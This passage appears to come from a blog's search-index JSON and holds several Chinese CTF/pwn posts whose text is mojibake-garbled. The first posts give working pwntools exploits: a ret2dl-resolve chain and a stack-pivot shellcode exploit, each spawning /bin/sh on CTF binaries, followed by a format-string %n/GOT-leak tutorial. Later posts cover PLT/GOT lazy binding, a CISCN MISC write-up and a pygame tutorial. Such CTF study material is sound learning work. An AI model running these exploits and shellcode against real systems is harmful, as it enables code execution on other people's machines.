process(&#x27;./main&#x27;)r.recvuntil(&#x27;Welcome to XDCTF2015~!\\n&#x27;)payload = &#x27;A&#x27; * offsetpayload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret)payload += p32(base_stage)payload += p32(leave_ret)r.sendline(payload)cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380 # objdump -d -j .plt mainrel_plt = 0x08048330 # objdump -s -j .rel.plt mainindex_offset = (base_stage + 28) - rel_plt # base_stage + 28æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»write_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 16) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(base_stage + 80)payload2 += &#x27;aaaa&#x27;payload2 += &#x27;aaaa&#x27;payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)çš„ä½ç½®payload2 += &quot;system\\x00&quot;payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\nX-CTF Quals 2016 - b0verfl0wè¿˜æ˜¯æ ˆæº¢å‡ºï¼Œä¸è¿‡è¿™æ¬¡é™¤äº†libcæ³„éœ²è¿˜å¯ä»¥é‡‡å–stack pivotingï¼Œå°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„ï¼Œç„¶åå†åœ¨ç›¸åº”çš„ä½ç½®è¿›è¡Œ ROPã€‚\n\næ²¡æœ‰å¼€å †æ ˆä¸å¯æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥é‡‡å–stack pivotingï¼Œå°†ROPå†™å…¥åœ¨æ ˆä¸­ï¼Œæ§åˆ¶eipæ‰§è¡Œå †æ ˆä¸­çš„ROPã€‚\n\næŸ¥æ‰¾gadgetsï¼Œå‘ç°å­˜åœ¨jmp espï¼Œæ‰€ä»¥å¯ä»¥è®©eipæ‰§è¡Œå †æ ˆä¸­çš„å†…å®¹ã€‚\nç¼–å†™shellcode\n12shellcode_x86 = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;sub_esp_jmp = asm(&#x27;sub esp, 0x28;jmp esp&#x27;)\n\nè®¡ç®—åç§»ã€‚fgetsåªå…è®¸è¯»å–50ä¸ªå­—èŠ‚ï¼Œsæ€»å…±èƒ½å­˜å‚¨0x20ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æº¢å‡º50-0x20-4=14å­—èŠ‚\n\næœ€åç¼–å†™exp\nEXP123456789101112from pwn import *sh = process(&#x27;./b0verfl0w&#x27;)shellcode_x86 = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;shellcode_x86 += &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;shellcode_x86 += &quot;\\x0b\\xcd\\x80&quot;jmp_esp = 0x08048504sub_esp_jmp = asm(&#x27;sub esp, 0x28;jmp esp&#x27;)payload = shellcode_x86+&#x27;a&#x27;*(0x20-len(shellcode_x86))+&#x27;a&#x27;*4+p32(jmp_esp)+sub_esp_jmpsh.sendline(payload)sh.interactive()\n\n","slug":"ROP-x86","date":"2021-10-05T10:23:30.000Z","categories_index":"å­¦ä¹ è®°å½•","tags_index":"pwn","author_index":"Krito"},{"id":"ce1b126727eaab3b04a4b3e82a32db07","title":"Fortmat String","content":"ä»‹ç»æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°ã€‚ä¼šè§¦å‘è¯¥æ¼æ´çš„å‡½æ•°å¾ˆæœ‰é™ã€‚ä¸»è¦å°±æ˜¯printfè¿˜æœ‰sprintfï¼Œfprintfç­‰ç­‰cåº“ä¸­printå®¶æ—çš„å‡½æ•°ã€‚å› ä¸ºä¸»è¦æ˜¯è€ƒæŸ¥printfå‡½æ•°æ‰€ä»¥æˆ‘å°±ç›´æ¥æ‹¿printfå‡½æ•°åšè®²è§£ã€‚\nåŸç†åœ¨å‰é¢ä»‹ç»ä¸­æåˆ°è¿‡ï¼Œprintfå‡½æ•°ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°ã€‚printfå‡½æ•°ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°åœ°å€å‹å…¥æ ˆä¸­è¯»å–æ—¶ï¼Œä¼šè·³è½¬åˆ°å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä¹‹åå†é€å­—èŠ‚è¾“å‡ºï¼Œå¦‚æœé‡åˆ°%å°±ä¼šæ ¹æ®%åé¢çš„å­—ç¬¦è¿›è¡Œåˆ¤æ–­å¹¶æŒ‰æŒ‡å®šè§„åˆ™è¾“å‡ºã€‚\n123456#include&lt;stdio.h&gt;int main()&#123;\tprintf(&quot;%s %d %c&quot;,&quot;hello&quot;,12,&#x27;a&#x27;);\treturn 0;&#125;\n\nä½¿ç”¨gdbè°ƒè¯•\n\nå› ä¸ºæ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥è°ƒç”¨printfå‰ä¼šå°†printfçš„å‚æ•°å‹å…¥æŒ‡å®šæŒ‡å®šå¯„å­˜å™¨ã€‚Cè¯­è¨€é»˜è®¤è°ƒç”¨åè®®æ˜¯__cdeclï¼Œæ‰€ä»¥ä¼ å‚æ–¹å¼æ˜¯ä»å³åˆ°å·¦ã€‚ä¼ å‚æ–¹é¢ï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œç¨‹åºä¼šå°†è¯¥å­—ç¬¦ä¸²çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥åˆ°å¯„å­˜å™¨ã€‚\nç¨‹åºæ˜¯å¦‚ä½•åˆ¤æ–­å‚æ•°æ˜¯åœ¨å“ªä¸€ä¸ªä½ç½®ï¼Ÿå…¶å®å¾ˆç®€å•ï¼Œç¨‹åºä¼šå…ˆæ‰¾åˆ°å­—ç¬¦ä¸²çš„ä½ç½®å¹¶é€å­—èŠ‚è¯»å–ï¼Œåœ¨è¯»å–è¿‡ç¨‹ä¸­ä¼šåˆ¤æ–­è¯¥å­—èŠ‚æ˜¯å¦æ˜¯%ï¼Œå¦‚æœæ˜¯å°±ä¼šæ ¹æ®ä¸‹ä¸€å­—èŠ‚æ¥ç¡®å®šä»¥ä½•ç§æ–¹å¼è¾“å‡ºåé¢çš„å‚æ•°ã€‚\næ‰€ä»¥è¯´æ¼æ´åœ¨å“ªé‡Œï¼Ÿå½“åé¢çš„å‚æ•°ä¸å¤Ÿæ—¶ï¼Œä¹Ÿå°±æ˜¯å‚æ•°ä½å¤§äºå‚æ•°æ—¶ï¼Œprintfå°±ä¼šè¾“å‡ºæœ€åä¸€ä¸ªå‚æ•°åé¢åœ°å€é‡Œé¢çš„å€¼è¾“å‡ºå‡ºå»ï¼Œä»¥æ­¤ç±»æ¨ï¼Œè¿™æ ·å°±å¯ä»¥æ³„éœ²åœ°å€äº†ã€‚\næ‰€ä»¥æˆ‘ä»¬åº”è¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿé¦–å…ˆï¼Œæˆ‘ä»¬å¯åˆ©ç”¨è¿™ä¸ªæ–¹å¼æ¥æ³„éœ²æŸä¸ªå‡½æ•°çš„gotè¡¨ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¦‚æœå°†printfçš„å‚æ•°ä¿®æ”¹æˆæŸä¸ªå‡½æ•°çš„gotè¡¨åœ°å€ï¼Œå½“printfè¾“å‡ºæ—¶å°±å¯ä»¥æŠŠè¿™ä¸ªå‡½æ•°gotè¡¨çš„å†…å®¹è¾“å‡ºå‡ºæ¥ä»è€Œé€ æˆåœ°å€æ³„éœ²ã€‚å…¶æ¬¡ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨printfä¿®æ”¹æŸä¸ªå‚æ•°çš„å€¼ã€‚å…ˆè¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œ**%n,ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚**æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥ä¿®æ”¹æŸä¸ªåœ°å€é‡Œé¢çš„å€¼ï¼Œé¦–å…ˆæˆ‘ä»¬å¯ä»¥å°†å¯¹åº”åœ°å€ä½œä¸ºå‚æ•°ï¼Œåœ¨è¯»å–åˆ°è¿™ä¸ªå‚æ•°ä¹‹å‰å…ˆè¾“å‡ºä¸æˆ‘ä»¬æƒ³è¦ä¿®æ”¹å€¼ç­‰æ•°é‡çš„å­—ç¬¦ä¸ªæ•°ï¼Œæœ€åç”¨%næ¥ä¿®æ”¹è¿™ä¸ªå€¼ã€‚è¿™é‡Œå¯ä»¥å‚è€ƒæˆ‘å†™çš„ä¸€ç¯‡æ–‡ç« pwn5ã€‚\nè¡¥å……è¦†ç›–å°æ•°æœ‰äº›æ—¶å€™æˆ‘ä»¬éœ€è¦è¦†ç›–çš„å€¼å¯èƒ½è¾ƒå°ï¼Œåªéœ€è¦æ”¹åŠ¨ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œ%nä¸€æ¬¡æ€§ä¼šä¿®æ”¹4æˆ–8å­—èŠ‚ï¼Œä¼šå¯¼è‡´è¦†ç›–äº†æˆ‘ä»¬ä¸æƒ³è¦†ç›–çš„å€¼ä»è€Œå‡ºç°é”™è¯¯ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨%hnæˆ–è€…%hhnä¿®æ”¹ä¸¤å­—èŠ‚æˆ–è€…ä¸€å­—èŠ‚ã€‚è¿™æ ·å°±å¯ä»¥é¿å…ä¸å¿…è¦çš„è¦†ç›–ã€‚\næ³„éœ²æŒ‡å®šçš„å‚æ•°æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸æ–­ä½¿ç”¨%xæ¥æ³„éœ²æŒ‡å®šå†…å­˜ï¼Œä½†æ˜¯å¦‚æœç¨‹åºé™åˆ¶äº†å­—èŠ‚æ•°é‚£è¯¥æ€ä¹ˆåŠã€‚æ¯”å¦‚\n123char str[10];read(0,str,10);printf(str);\n\næˆ‘ä»¬æœ€å¤šåªèƒ½è¾“å‡º5ä¸ª%xï¼Œå¦‚æœè¦æ³„éœ²çš„åœ°å€åœ¨åé¢æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡%n$xæ¥æ³„éœ²å¯¹åº”çš„å‚æ•°ï¼ˆnä»£è¡¨å¯¹åº”å‚æ•°çš„ä½ç½®ï¼‰\n","slug":"Fortmat-String","date":"2021-10-01T03:26:49.000Z","categories_index":"pwn","tags_index":"ç¬”è®°","author_index":"Krito"},{"id":"a4072082096b626cb339c7cf12b546b7","title":"å»¶è¿Ÿç»‘å®š","content":"ç¨‹åºè¿è¡Œæ—¶ï¼Œprintfçš„åœ°å€å°±ä¼šè¢«å­˜å‚¨åˆ°dataæ®µï¼Œcall   c &lt;hello+0xc&gt;å°±ä¼šè·³è½¬åˆ°call printf_stub\n123printf_stub:\tmov rax,[printfå‡½æ•°åœ°å€]\tjmp rax\n\n\n\nç¨‹åºåœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œå³pltè¡¨å’Œgotè¡¨ã€‚\n\npltè¡¨ä¸ºï¼ˆProcedure Link Tableï¼‰ï¼Œæ˜¯Linux ELFæ–‡ä»¶ä¸­ç”¨äºå»¶è¿Ÿç»‘å®šçš„è¡¨ï¼Œå³å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰è¿›è¡Œç»‘å®š\ngotè¡¨ä¸ºï¼ˆGlobal Offset Tableï¼‰ï¼Œæ˜¯Linux ELFæ–‡ä»¶ä¸­ç”¨äºå®šä½å…¨å±€å˜é‡å’Œå‡½æ•°çš„ä¸€ä¸ªè¡¨ã€‚\n\nå»¶è¿Ÿç»‘å®šç¨‹åºåœ¨æ‰§è¡Œå‰ï¼Œå¦‚æœå¯¹æ•´ä¸ªåŠ¨æ€é“¾æ¥åº“å‡½æ•°è¿›è¡Œç¬¦å·è§£æçš„è¯ï¼Œæ˜¯éå¸¸æµªè´¹èµ„æºçš„ï¼Œå› ä¸ºä¸€ä¸ªç¨‹åºä¸å¯èƒ½è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­æ‰€æœ‰çš„å‡½æ•°ã€‚æˆ‘ä»¬æœ€å¥½èƒ½åšåˆ°åªå¯¹ç”¨åˆ°çš„å‡½æ•°è¿›è¡Œå‡½æ•°è§£æï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æé«˜æ–‡ä»¶é“¾æ¥çš„æ•ˆç‡ï¼ŒåŠ å¿«ç¨‹åºçš„å¯åŠ¨é€Ÿåº¦ã€‚\nä¸ºæé«˜CPUçš„åˆ©ç”¨æ•ˆç‡ï¼ŒåŠ¨æ€é“¾æ¥å™¨é»˜è®¤é‡‡ç”¨å»¶è¿Ÿé“¾æ¥æ–¹å¼ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¸ä¼šåœ¨ç¨‹åºåŠ è½½æ—¶è§£ææ¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯åœ¨è°ƒç”¨æ—¶é€šè¿‡pltå’Œgotæ¥å¯¹å‡½æ•°è¿›è¡Œè§£æï¼Œç„¶åä¼šå°†è§£æè·å¾—å‡½æ•°åœ°å€å­˜æ”¾åœ¨gotä¸­ï¼Œä¸‹ä¸€æ¬¡è°ƒç”¨æ—¶ä¼šç›´æ¥ä½¿ç”¨gotä¸­çš„å‡½æ•°åœ°å€å¯¹å‡½æ•°è¿›è¡Œè°ƒç”¨ã€‚\nç¬¬ä¸€æ¬¡è°ƒç”¨ç¬¬ä¸€æ¬¡è°ƒç”¨æŸä¸ªå‡½æ•°æ—¶ï¼Œä¼šç»å†ä»¥ä¸‹è¿‡ç¨‹:\nxxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; å…¬å…±@plt -&gt; _dl_runtime_resolve -&gt; å‡½æ•°åœ°å€\nç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œç”±äºå»¶è¿Ÿç»‘å®šï¼Œæ‰€ä»¥gotè¡¨é‡Œé¢å¹¶æ²¡æœ‰å‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œæ­¤æ—¶gotè¡¨å­˜å‚¨çš„æ˜¯å‡½æ•°çš„pltè¡¨ä¸‹ä¸€å‘½ä»¤åœ°å€ã€‚ä½†æ˜¯åœ¨pltè·³è½¬åˆ°gotæ—¶è¿˜ä¼šå°†æŸä¸ªæ•°å‹å…¥æ ˆä¸­ï¼Œè¿™ä¸ªæ•°å¯ä»¥çœ‹å‡ºè¿™ä¸ªå‡½æ•°çš„IDï¼Œä¹‹åè¿›å…¥åˆ°å…¬å…±@pltè·³è½¬æ‰§è¡Œ_dl_runtime_resolveå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ ¹æ®å‡½æ•°IDæ¥å¯»æ‰¾å¯¹åº”å‡½æ•°ï¼Œå¹¶æ”¹å˜gotè¡¨åœ°å€ä¸ºå‡½æ•°çœŸæ­£åœ°å€ã€‚\n\nç¬¬äºŒæ¬¡è°ƒç”¨å› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨å·²ç»å°†gotè¡¨å’Œå‡½æ•°è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥è°ƒç”¨æŸä¸ªå‡½æ•°æ—¶çš„æµç¨‹å°±å˜æˆå¦‚ä¸‹ï¼š\nxxx@plt -&gt; xxx@got -&gt; å‡½æ•°åœ°å€\nè°ƒè¯•ä»¥ä¸‹é¢ä»£ç ä¸ºä¾‹è¿›è¡Œè°ƒè¯•\n12345678910#include&lt;stdio.h&gt;void hello()&#123;\tprintf(&quot;Hello World&quot;);&#125;int main()&#123;\thello();\treturn 0;&#125;\n\nä½¿ç”¨å‘½ä»¤ç¼–è¯‘æŸ¥çœ‹ï¼š \n\ngcc -Wall -g -o try.o -c try.c -m32                \nobjdump -d try.o\n\n\nç¨‹åºè¿è¡Œæ—¶ï¼Œprintfçš„åœ°å€å°±ä¼šè¢«å­˜å‚¨åˆ°dataæ®µï¼Œcall   c &lt;hello+0xc&gt;å°±ä¼šå˜æˆcall printf_stubï¼Œprintf_stubå°±ä¼šè·³è½¬åˆ°dataæ®µä¸­printfåœ°å€ï¼Œæœ€åè·³è½¬åˆ°printfå‡½æ•°ã€‚printf_stubå°±ç›¸å½“äºprintfçš„pltè¡¨ï¼Œdataæ®µä¸­å­˜å‚¨printfåœ°å€å°±ç›¸å½“äºprintfçš„gotè¡¨ã€‚\n\n","slug":"pltã€gotå’Œå»¶è¿Ÿç»‘å®š","date":"2021-10-01T02:26:57.000Z","categories_index":"å¿ƒå¾—","tags_index":"pwn","author_index":"Krito"},{"id":"dde0577c288faf648c0d6f90bbb39dc6","title":"CISCNå¤ç°","content":"å‰è¨€åˆæ¬¡å‚åŠ è¿™ç§å¤§å‹æ¯”èµ›ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯é¢˜ç›®å‡ºçš„æŒºä¸é”™ï¼ˆä¸€é¢˜éƒ½æ²¡åšå‡ºæ¥ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªæ¯”èµ›å½¢å¼ç€å®ä»¤äººä¸è§£ã€‚ä¸ä»…å¦‚æ­¤ï¼Œåœ¨å†™å®Œé€‰æ‹©é¢˜åç³»ç»Ÿå´©æºƒä¹Ÿæ˜¯æˆ‘æ²¡æƒ³å¾—åˆ°ï¼ˆè™½ç„¶æ²¡æœ‰åœæ»å¾ˆä¹…ï¼Œä½†æ˜¯æ„Ÿè§‰å¾ˆæ„å¤–ï¼Œæ¯•ç«Ÿæ˜¯å›½èµ›ï¼‰ã€‚\nMISCéš”ç©ºä¼ è¯é™„ä»¶æ˜¯ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢å…¨æ˜¯åå…­è¿›åˆ¶ç ï¼Œæ ¹æ®é¢˜ç›®æœç´¢å‘ç°æ˜¯PDUç¼–ç è§£ç ï¼Œè§£ç å‘ç°å‰é¢å››è¡Œå¾—åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼šflagå‰é¢ä¸€éƒ¨åˆ†æ˜¯15030442å’Œw465ã€‚è€Œåé¢åˆ™æ˜¯ä¸€å †åå…­è¿›åˆ¶ç ï¼Œä½†æ˜¯å‘ç°åœ¨ç¬¬ä¸€è¡Œåå…­è¿›åˆ¶ç çš„å¼€å¤´å‡ ä¸ªåå…­è¿›åˆ¶ç æ­£å¥½æ˜¯pngåå…­è¿›åˆ¶æ–‡ä»¶å¤´ï¼ŒçŒœæµ‹è¿™äº›åº”è¯¥æ˜¯pngå›¾ç‰‡çš„åå…­è¿›åˆ¶ç ï¼Œåˆ©ç”¨è„šæœ¬å°†å…¶å¯¼å‡ºï¼š\n1234567891011121314151617181920212223242526272829303132333435363738394041from selenium import webdriver# æ‰“å¼€è¯»å–data.txtæ–‡ä»¶with open(&#x27;../data.txt&#x27;, &#x27;r&#x27;) as f:    data = f.read()data = data.splitlines()[4:]  # å‰å››æ¡ä¸æ˜¯åå…­è¿›åˆ¶# å¯åŠ¨è°·æ­Œbrowser = webdriver.Chrome()url = &quot;http://www.sendsms.cn/pdu/&quot;browser.get(url)output = &#x27;&#x27;  # ç”¨äºæ¥æ”¶ç»“æœfor i in data:    browser.find_element_by_name(&quot;smsText2&quot;).clear()  # æ¸…ç©ºè½¬æ¢æ¡†é‡Œé¢çš„å†…å®¹    browser.find_element_by_name(&quot;smsText2&quot;).send_keys(i)  # è¾“å…¥è¦ç¿»è¯‘çš„å†…å®¹    browser.find_element_by_xpath(&quot;//input[@name=&#x27;checkButton&#x27;]&quot;).click()  # ç‚¹å‡»ç¿»è¯‘    recv = browser.find_element_by_name(&quot;smsOut&quot;).get_attribute(&#x27;value&#x27;)  # è·å–ç¿»è¯‘å†…å®¹    recv = recv.split()  # å°†è·å¾—å†…å®¹æŒ‰ç©ºæ ¼åˆ†å¼€    n = 0    txt = &#x27;&#x27;    for j in recv:  # è¯»å–éœ€è¦çš„ä¿¡æ¯        if n == 3:  # è·å–æ—¶é—´æˆ³            txt += j        if n == 13:            txt += j  # è·å–åå…­è¿›åˆ¶ç             txt += &#x27;\\n&#x27;  # åˆ†è¡Œ        n += 1    output += txtbrowser.quit()  # é€€å‡ºæµè§ˆå™¨output = output.splitlines()result = &#x27;&#x27;time = []data = []for i in output:  # æŒ‰æ—¶é—´æˆ³è¿›è¡Œæ’åº    time.append(int(i[3:5]) * 60 + int(i[6:8]) - 1800)    data.append(i[8:])for i in range(0, 1200):    for j in range(len(data)):        if i == time[j]:            result += data[j]with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f:  # å°†ç»“æœä¿å­˜åˆ°out.txtæ–‡ä»¶ä¸­    f.write(result)\n\nä¹‹åå¯¼å‡ºå›¾ç‰‡ï¼Œå‘ç°å›¾ç‰‡ä¹±ä¸ƒå…«ç³Ÿï¼Œæƒ³åˆ°ä¹‹å‰w465åº”è¯¥æ˜¯width465è½¬æˆåå…­è¿›åˆ¶ç å°±æ˜¯1D1ï¼Œå¾—åˆ°å›¾ç‰‡\n\nç»“åˆå‰é¢å¾—åˆ°flagï¼šCISCN{15030442_b586_4c9e_b436_26def12293e4}\n","slug":"CISCNå¤ç°","date":"2021-05-18T11:25:16.000Z","categories_index":"MISC","tags_index":"wp","author_index":"Krito"},{"id":"7ceb9bfebefe73ecc89b8753e3a43190","title":"pygameä½¿ç”¨","content":"\n\n\n\n\n\n\n\n\näº†è§£ï¼Œå­¦ä¹ ä¸€ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œæœ€å¥½æ˜¯å»å®˜ç½‘å­¦ä¹ ï¼Œå› ä¸ºå®˜æ–¹æœ‰ç¬¬ä¸€æ‰‹èµ„æ–™ï¼Œè€Œåœ¨å…¶ä»–äººæ‰‹é‡Œåˆ™æ˜¯ç¬¬äºŒæ‰‹ï¼Œä½¿ç”¨è¦å­¦å¥½è¿˜æ˜¯å¾—å»å®˜ç½‘ã€‚åœ¨è¿™é‡Œæˆ‘å°±ç›´æ¥æ‹¿å®ä¾‹è®²pygame\nå®‰è£…pygame (windows)1python -m pip install -U pygame --user\n\nå¯èƒ½çš„æŠ¥é”™ï¼š\n\nè¾“å…¥pythonå¯èƒ½ä¼šæŠ¥é”™ï¼Œæ”¹æˆpython3\næ— æ³•ä¸‹è½½ï¼Œæ£€æŸ¥ç½‘ç»œæ˜¯å¦æ­£å¸¸ï¼Œç¡®è®¤æ— è¯¯è¿˜æ˜¯æ— æ³•ä¸‹è½½ï¼ŒæŸ¥çœ‹æ˜¯å¦ä½¿ç”¨äº†æ¢¯å­ï¼Œå¦‚æœä½¿ç”¨å°±å…³é—­ã€‚\n\nè®¾è®¡æ€è·¯è®¾è®¡ä¸€ä¸ªæ¸¸æˆå¿…é¡»å…ˆæœ‰æ€è·¯ï¼Œè¿™é‡Œæˆ‘å¼•ç”¨äº†ä¸€ä¸ªå¤§ä½¬çš„å›¾ç‰‡ï¼ŒåŸºæœ¬æ€è·¯å·®ä¸å¤šï¼Œæ¥ä¸‹æ¥å°±æ ¹æ®è¿™ä¸ªæ€è·¯å¼€å§‹è®¾è®¡è¿™ä¸ªæ¸¸æˆ\n\né¦–å…ˆï¼Œåœ¨è®¾è®¡æ—¶è¦æ˜ç¡®æ¸¸æˆæœ‰å“ªäº›å…ƒç´ ï¼Œä»è€Œåˆ›å»ºå¯¹åº”çš„ç±»ã€‚åœ¨é£æœºå¤§æˆ˜ä¸­ï¼Œè¦åˆ›å»ºä»¥ä¸‹å‡ ä¸ªç±»ï¼š\n\nç”¨äºç®¡ç†æ¸¸æˆèµ„æºå’Œè¡Œä¸ºçš„ç±»ï¼ˆæˆ‘æ˜¯å°†å®ƒæ”¾åœ¨alien_invasion.pyæ–‡ä»¶ä¸­ï¼Œä½œä¸ºæ¸¸æˆçš„å…¥å£ï¼‰\n\nå­˜å‚¨æ¸¸æˆè®¾ç½®çš„ç±»ï¼ˆsettings.pyï¼‰\n\nå­˜å‚¨é£æœºçš„ç±»ï¼ˆship.pyï¼‰\n\nå­˜å‚¨å­å¼¹çš„ç±»ï¼ˆbullet.pyï¼‰\n\nå­˜å‚¨æ•Œæœºçš„ç±»ï¼ˆAlien.pyï¼‰\n\nå­˜å‚¨æ¸¸æˆåˆå§‹æ•°æ®çš„ç±»ï¼ˆgame_stats.pyï¼‰\n\nå­˜å‚¨å¾—åˆ†çš„ç±»ï¼ˆscoreboard.pyï¼‰\n\nå­˜å‚¨åˆå§‹æ¸¸æˆç•Œé¢çš„ç±»ï¼ˆbottom.pyï¼‰\nalien_invasion.pyé¦–å…ˆè¦åˆå§‹åŒ–è¦æ˜¾ç¤ºçš„çª—å£æˆ–å±å¹•\n12345678910111213141516import sysimport pygameclass AlienInvasion:    def __init__(self):                                    pygame.init()                                                                                   #pygame.init()å®‰å…¨åœ°åˆå§‹åŒ–äº†æ‰€æœ‰å¯¼å…¥çš„pygameæ¨¡å—        self.screen = pygame.display.set_mode((1200,800))         #åˆå§‹å±å¹•ï¼Œ1200æ˜¯å±å¹•å®½åº¦ï¼Œ800æ˜¯å±å¹•é«˜åº¦        pygame.display.set_caption(&quot;Alien Invasion&quot;)                      #åœ¨å±å¹•è¾¹æ¡†ä¸Šé¢æ·»åŠ æ¸¸æˆåAlien Invasion    def run_game(self):                                                                         #æ¸¸æˆä¸»å¾ªç¯ï¼Œè®©æ¸¸æˆä¸æ–­æŒç»­ä¸‹å»        while True:            for event in pygame.event.get():                if event.type == pygame.QUIT:                                          # å¦‚æœç”¨æˆ·è¾“å…¥qæ¸¸æˆå°±ç»“æŸ                    sys.exit()            pygame.display.flip()if __name__ == &#x27;__main__&#x27;:      ai = AlienInvasion()    ai.run_game()\n\nç›¸å…³ä»£ç è§£é‡Šï¼š\n**if __ name __ == â€˜ __ main ï¼š â€˜**ï¼š name __ æ˜¯å½“å‰æ¨¡å—åï¼Œå½“æ¨¡å—è¢«ç›´æ¥è¿è¡Œæ—¶æ¨¡å—åä¸º __ main __ ã€‚è¿™å¥è¯çš„æ„æ€å°±æ˜¯ï¼Œå½“æ¨¡å—è¢«ç›´æ¥è¿è¡Œæ—¶ï¼Œä»¥ä¸‹ä»£ç å—å°†è¢«è¿è¡Œï¼Œå½“æ¨¡å—æ˜¯è¢«å¯¼å…¥æ—¶ï¼Œä»£ç å—ä¸è¢«è¿è¡Œã€‚ï¼ˆå¦‚æœè¿˜æ˜¯æœ‰ç–‘æƒ‘æŸ¥çœ‹é“¾æ¥ï¼‰\nfor event in pygame.event.get()ï¼šPygameä¼šæ¥å—ç”¨æˆ·çš„å„ç§æ“ä½œï¼ˆæ¯”å¦‚æŒ‰é”®ç›˜ï¼Œç§»åŠ¨é¼ æ ‡ç­‰ï¼‰äº§ç”Ÿäº‹ä»¶ï¼Œäº‹ä»¶éšæ—¶å¯èƒ½å‘ç”Ÿï¼Œè€Œä¸”é‡ä¹Ÿå¯èƒ½ä¼šå¾ˆå¤§ï¼ŒPygameçš„åšæ³•æ˜¯æŠŠä¸€ç³»åˆ—çš„äº‹ä»¶å­˜æ”¾ä¸€ä¸ªé˜Ÿåˆ—é‡Œï¼Œé€ä¸ªçš„å¤„ç†ã€‚è¿™è¡Œä»£ç å°±æ˜¯å°†äº‹ä»¶é€ä¸€è¯»å–ã€‚\nsettings.pyå­˜å‚¨æ¸¸æˆå…ƒç´ å±æ€§\n123456789101112131415161718192021222324252627282930class Settings:    def __init__(self):        self.screen_width = 1200                 #å±å¹•å®½åº¦        self.screen_height = 600                 #å±å¹•é«˜åº¦        self.bg_color = (230, 230, 230)      #èƒŒæ™¯é¢œè‰²        self.ship_speed = 1.5              \t        #é£èˆ¹ç§»åŠ¨é€Ÿåº¦        self.bullet_speed = 1.5          \t     